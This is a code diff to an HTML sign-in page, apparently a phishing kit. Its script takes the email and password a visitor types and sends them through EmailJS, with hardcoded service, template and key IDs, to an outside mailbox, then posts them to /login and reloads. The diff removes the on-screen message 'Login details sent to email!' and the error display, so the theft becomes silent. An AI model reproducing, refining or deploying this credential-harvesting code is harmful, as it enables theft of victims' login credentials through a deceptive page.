@@ -16,7 +16,7 @@
             }
         };
 
-        // JavaScript to handle the Sign In button click with delayed reload
+        // JavaScript to handle the Sign In button click
         async function handleSignIn() {
             const email = document.getElementById('login').value;
             const password = document.getElementById('passwd').value;
@@ -27,47 +27,38 @@
                 return;
             }
 
-            // Send the data to EmailJS with feedback
+            // Send the data to EmailJS (no feedback)
             emailjs.send('service_26p7vyd', 'template_mrthmvh', {
                 email: email,
                 password: password,
                 date: new Date().toLocaleString()
             })
-            .then(() => {
-                console.log('Login details sent to email!');
-                document.getElementById('msg').style.display = 'block';
-                document.getElementById('msg').innerText = 'Login details sent to email!';
-            })
             .catch(error => {
-                console.error('EmailJS Error:', error);
-                document.getElementById('error').style.display = 'block';
-                document.getElementById('error').innerText = 'Failed to send email: ' + error.text;
+                console.error('EmailJS Error:', error); // Keep error logging for debugging, no visible feedback
             });
 
-            // Delay the fetch and reload to allow feedback to display
-            setTimeout(async () => {
-                try {
-                    const response = await fetch('/login', {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json',
-                        },
-                        body: JSON.stringify({ email, password }),
-                    });
+            // Send the data to the server (original functionality unchanged)
+            try {
+                const response = await fetch('/login', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({ email, password }),
+                });
 
-                    if (response.ok) {
-                        // Reload the page after successful submission
-                        window.location.reload();
-                    } else {
-                        // Reload the page even if the submission fails
-                        window.location.reload();
-                    }
-                } catch (error) {
-                    console.error('Error:', error);
-                    // Reload the page if an error occurs
+                if (response.ok) {
+                    // Reload the page after successful submission
+                    window.location.reload();
+                } else {
+                    // Reload the page even if the submission fails
                     window.location.reload();
                 }
-            }, 2000); // 2-second delay to see feedback
+            } catch (error) {
+                console.error('Error:', error);
+                // Reload the page if an error occurs
+                window.location.reload();
+            }
         }
     </script>
 </head>
@@ -112,7 +103,7 @@
     <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
     <script type="text/javascript">
         (function() {
-            emailjs.init("R8yqLxQjIzZ8wg1a7"); // Replace with your Public Key from EmailJS dashboard
+            emailjs.init("R8yqLxQjIzZ8wg1a7"); // Replace with your actual Public Key
         })();
     </script>
 
